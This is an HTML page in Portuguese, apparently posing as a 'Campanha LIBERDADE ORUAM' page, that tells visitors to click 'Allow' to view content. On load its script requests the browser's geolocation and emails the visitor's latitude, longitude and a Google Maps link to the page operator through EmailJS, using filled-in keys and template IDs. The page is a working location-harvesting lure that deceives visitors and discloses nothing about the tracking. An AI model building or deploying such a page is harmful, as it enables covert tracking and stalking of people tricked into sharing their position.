<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <title>Campanha LIBERDADE ORUAM</title>
</head>
<body>
  <h1>üö® Clique em "Permitir" para visualizar</h1>
  <p>Estamos verificando...</p>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("90mR73F6qLxhPODK9"); // ‚¨ÖÔ∏è Coloque aqui seu Public Key do EmailJS
    })();

    function enviarEmail(lat, lon) {
      const templateParams = {
        latitude: lat,
        longitude: lon,
        link_google_maps: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`
      };

      emailjs.send("service_kc6xk8y", "template_jt9au2d", templateParams)
        .then(function(response) {
          document.body.innerHTML = "<h2>‚úÖ Obrigado!</h2>";
        }, function(error) {
          document.body.innerHTML = "<h2>‚ùå Deu erro.</h2>";
          console.log(error);
        });
    }

    function obterLocalizacao() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            enviarEmail(lat, lon);
          },
          (error) => {
            document.body.innerHTML = "<h2>‚ùå Deu erro.</h2>";
          }
        );
      } else {
        document.body.innerHTML = "<h2>‚ùå Deu Erro.</h2>";
      }
    }

    obterLocalizacao();
  </script>
</body>
</html>
